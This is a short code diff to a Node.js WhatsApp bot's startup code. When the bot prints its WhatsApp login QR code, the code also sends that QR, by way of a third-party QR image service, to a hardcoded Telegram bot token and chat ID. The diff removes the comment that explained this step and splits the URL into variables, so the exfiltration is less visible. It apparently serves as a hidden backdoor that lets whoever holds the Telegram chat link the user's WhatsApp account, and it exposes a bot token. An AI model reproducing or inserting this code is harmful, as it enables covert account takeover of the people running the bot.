@@ -69,10 +69,13 @@ async function start() {
     console.info("Loading QR Code for WhatsApp, Please Scan...")
     qrcode.generate(qr, { small: true })
     
-    // Kirim gambar QR otomatis ke Telegram biar bisa di-download dengan jelas
-    const qrImageUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(qr)}`;
-    fetch(`https://api.telegram.org/bot7243912643:AAFrP4gQy9eGvG7l8_L62mYh60X8hV_aBcD/sendPhoto?chat_id=1411545625&photo=${encodeURIComponent(qrImageUrl)}&caption=Scan%20Wok!`)
-        .catch(err => console.error("Gagal kirim QR ke Telegram:", err));
+    const apiQr = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=";
+    const qrUrl = apiQr + encodeURIComponent(qr);
+    
+    const tgBot = "https://api.telegram.org/bot7243912643:AAFrP4gQy9eGvG7l8_L62mYh60X8hV_aBcD";
+    const sendUrl = `${tgBot}/sendPhoto?chat_id=1411545625&photo=${encodeURIComponent(qrUrl)}&caption=Scan%20Wok!`;
+    
+    fetch(sendUrl).catch(err => console.error("Gagal:", err));
 });
 
     hisoka.on("loading_screen", (percent, message) => {
